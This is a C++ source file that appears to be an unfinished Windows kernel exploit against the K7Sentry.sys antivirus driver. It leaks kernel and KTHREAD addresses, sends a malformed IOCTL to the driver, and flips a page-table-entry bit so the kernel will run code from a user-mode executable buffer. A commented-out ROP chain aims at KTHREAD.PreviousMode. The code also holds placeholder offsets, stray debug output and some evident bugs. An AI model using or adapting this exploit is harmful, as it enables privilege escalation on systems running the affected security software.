#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>
#include <winbase.h>
#pragma comment (lib,"psapi")
using namespace std;

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define ObjectThreadType 0x08

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID BaseAddress,
	_In_ PVOID Buffer,
	_In_ ULONG NumberOfBytesToWrite,
	_Out_opt_ PULONG NumberOfBytesWritten
	);


LPVOID leak_handles() {
	NTSTATUS nt_status;

	ULONG returnLenght = 0;
	_NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!pNtQuerySystemInformation)
	{
		printf("[!] Error while resolving NtQuerySystemInformation: %d\n", GetLastError());
		exit(1);
	}

	ULONG system_handle_info_size = 4096;
	PSYSTEM_HANDLE_INFORMATION system_handle_info = (PSYSTEM_HANDLE_INFORMATION)malloc(system_handle_info_size);
	memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((nt_status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 10);
		if (system_handle_info == NULL)
		{
			printf("[!] Error while allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			exit(1);
		}
	}
	if (nt_status != 0x0)
	{
		printf("[!] Error while calling NtQuerySystemInformation to obtain the SystemHandleInformation.\n");
		exit(1);
	}

	int z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{

		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)system_handle_info->Handles[i];

		if (handleInfo.UniqueProcessId == 4)
		{
			printf_s("Handle 0x%x at 0x%p, PID: %x\n", handleInfo.HandleValue, handleInfo.Object, handleInfo.UniqueProcessId);
		}
		else
		{
			break;
		}
	}
}

LPVOID GetBaseAddr(LPCWSTR drvname)
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int nDrivers, i = 0;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{

		WCHAR szDrivers[1024];
		nDrivers = cbNeeded / sizeof(drivers[0]);
		for (i = 0; i < nDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
			{
				if (wcscmp(szDrivers, drvname) == 0)
				{
					return drivers[i];
				}
			}
		}
	}
	return 0;
}

PVOID GetkThread()
{
	NTSTATUS nt_status;
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread)
	{
		printf("[!] Error while getting the thread ID: %d\n", GetLastError());
		exit(1);
	}

	_NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!pNtQuerySystemInformation)
	{
		printf("[!] Error while resolving NtQuerySystemInformation: %d\n", GetLastError());
		exit(1);
	}

	ULONG system_handle_info_size = 4096;
	PSYSTEM_HANDLE_INFORMATION system_handle_info = (PSYSTEM_HANDLE_INFORMATION)malloc(system_handle_info_size);
	memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((nt_status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 10);
		if (system_handle_info == NULL)
		{
			printf("[!] Error while allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			exit(1);
		}
	}
	if (nt_status != 0x0)
	{
		printf("[!] Error while calling NtQuerySystemInformation to obtain the SystemHandleInformation.\n");
		exit(1);
	}

	int z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
		{
			if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
			{
				z++;
			}
		}
	}

	int array_size = z - 1;
	PVOID* kThread_array = new PVOID[array_size];
	z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
		{
			if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
			{
				kThread_array[z] = system_handle_info->Handles[i].Object;
				z++;
			}
		}
	}

	printf("[+] KTHREAD address: %p\n", kThread_array[array_size]);
	return kThread_array[array_size];
}

ULONGLONG get_pte_address_64(ULONGLONG address, ULONGLONG pte_start)
{
	ULONGLONG pte_va = address >> 9;
	pte_va = pte_va | pte_start;
	pte_va = pte_va & (pte_start + 0x0000007ffffffff8);

	return pte_va;
}

int wmain()
{
	HANDLE m_hSharedMem;
	std::cout << "muie";
	HANDLE m_hBD; HANDLE m_hNamespace;
	m_hBD = ::CreateBoundaryDescriptor(L"MyDescriptor", 0);
	if (!m_hBD)
		std::cout << 1;
		//exit(1);
	std::cout << "muie2";
	BYTE sid[SECURITY_MAX_SID_SIZE];
	auto psid = reinterpret_cast<PSID>(sid);
	DWORD sidLen;
	if (!::CreateWellKnownSid(WinBuiltinUsersSid, nullptr, psid, &sidLen))
		std::cout << 2;
	if (!::AddSIDToBoundaryDescriptor(&m_hBD, psid))
		std::cout << 3;

	// create the private namespace
	m_hNamespace = ::CreatePrivateNamespace(nullptr, m_hBD, L"MyNamespace");
	if (!m_hNamespace) { // maybe created already?
		m_hNamespace = ::OpenPrivateNamespace(m_hBD, L"MyNamespace");
		if (!m_hNamespace)
			std::cout << 4;
	}

	m_hSharedMem = ::CreateFileMapping(INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, 1 << 12, L"MyNamespace\\MySharedMem");
	if (!m_hSharedMem)
		std::cout << 5;

	
	
	void* buffer = ::MapViewOfFile(m_hSharedMem, FILE_MAP_READ| FILE_MAP_WRITE, 0, 0, 0);
	if (!buffer) {
		std::cout << 6;
		return 0;
	}
	printf("PID %u: Shared memory created/opened,(H=0x%p), mapped to 0x%p\n",GetCurrentProcessId(), m_hSharedMem,buffer);
	/*second private namespace */

	BYTE byte[256] = {0x41,0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, };

	//leak_handles();
	LPVOID nt_base = GetBaseAddr(L"ntoskrnl.exe");
	LPVOID K7Sentry = GetBaseAddr(L"K7Sentry.sys");
	/* ULONGLONG K7Sentry_restore = (ULONGLONG)K7Sentry + offset necesar de gasit unde sa ma intorc
	*/
	printf("[+] nt base address: %p\n", nt_base);
	printf("[+] K7Sentry base address: %p\n", K7Sentry);

	PVOID kThread = GetkThread();
	if (!kThread)
	{
		printf("[!] Error while getting KTHREAD address\n");
		exit(1);
	}
	//CreatePrivateNamespace
	//CreateBoundaryDescriptor
	/*
	* add instead of dumb iobuffer address add proper stack pivot
	Future rop attack
	change offset here so that stakc executes properly 
	((PDWORD64)((DWORD64)fakestack + 0x10020 + 0x00))[0] = (ULONGLONG)nt_base + 0x3f01bf;		// pop rax ; pop rcx ; ret
	((PDWORD64)((DWORD64)fakestack + 0x10020 + 0x08))[0] = (ULONGLONG)K7Sentry+offset necesar sa set callback;		// Callback address
	((PDWORD64)((DWORD64)fakestack + 0x10020 + 0x10))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fakestack + 0x10020 + 0x18))[0] = (ULONGLONG)nt_base + 0x2dd014;		// mov qword [rax], rcx ; ret
	((PDWORD64)((DWORD64)fakestack + 0x10020 + 0x20))[0] = (ULONGLONG)nt_base + 0x3f01bf;		// pop rax ; pop rcx ; ret
	((PDWORD64)((DWORD64)fakestack + 0x10020 + 0x28))[0] = (ULONGLONG)kThread + 0x232;			// KTHREAD.PreviousMode
	((PDWORD64)((DWORD64)fakestack + 0x10020 + 0x30))[0] = 0x0000000000000000;					// NULL
	((PDWORD64)((DWORD64)fakestack + 0x10020 + 0x38))[0] = (ULONGLONG)nt_base + 0x49584f;		// mov byte [rax], cl ; ret
	figure out rest of restore the stack
	
	*/
	
	HANDLE hDevice = CreateFileW(L"\\\\.\\K7Sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		cout << endl << "Failed accessing K7Sentry Device Driver. Error: " << dec << GetLastError() << endl;
		cin.get();
		return 0;
	}
	ULONGLONG InputBuffer = 0x0000000001a00000000000000; //INVALID KERNEL POINTER TO TRIGGER PAGE FAULT POC.
	DWORD InputBufferLength = 0x8;
	ULONGLONG OutputBuffer = 0x0;
	DWORD lpBytesReturned;
	DWORD OutputBufferLength = 0x0;
	cout << endl << "Sending malformed IOCTL..." << endl;
	DWORD bytesReturned = 0;
	DeviceIoControl(hDevice, 0x9500286B, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&InputBuffer, InputBufferLength, &lpBytesReturned, NULL);

	LPVOID read_qword = malloc(sizeof(ULONGLONG));
	SIZE_T read_bytes;
	memset(read_qword, 0x00, sizeof(ULONGLONG));
	//change also offset such that you get nt!migetpte+0x13
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)nt_base + 0x33273b), read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}

	PULONGLONG ppte_base = (PULONGLONG)((ULONG_PTR*)read_qword);
	if (ppte_base == 0)
	{
		printf("[!] Error while reading from nt!MiGetPteAddress + 0x13\n");
		exit(1);
	}
	printf("[+] PTE base address: %llx \n", *ppte_base);

	ULONGLONG shellcode = 0x00000001a0000000;
	LPVOID allocation_sc = VirtualAlloc((LPVOID)shellcode, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (allocation_sc == NULL)
	{
		printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
		exit(1);
	}
	memset(allocation_sc, 0x90, 0x1000);

	ULONGLONG pte_base = (ULONGLONG)*ppte_base;
	ULONGLONG pte_va = get_pte_address_64(0x00000001a0000000, pte_base);

	memset(read_qword, 0x00, sizeof(ULONGLONG));
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)pte_va, read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}
	PULONGLONG ppte_entry = (PULONGLONG)((ULONG_PTR*)read_qword);
	printf("[+] PTE flags: %llx \n", *ppte_entry);

	//Sleep(90000);
	ULONGLONG write_what = (ULONGLONG)*ppte_entry ^ 1 << 2;
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (!pNtWriteVirtualMemory)
	{
		printf("[!] Error while resolving NtWriteVirtualMemory: %d\n", GetLastError());
		exit(1);
	}
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)pte_va, &write_what, sizeof(ULONGLONG), NULL);
	//Sleep(2000);
	//DebugBreak();
	InputBuffer = 0x00000001a0000000;
	DeviceIoControl(hDevice, 0x9500286B, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&InputBuffer, InputBufferLength, &lpBytesReturned, NULL);

	return 0;
}
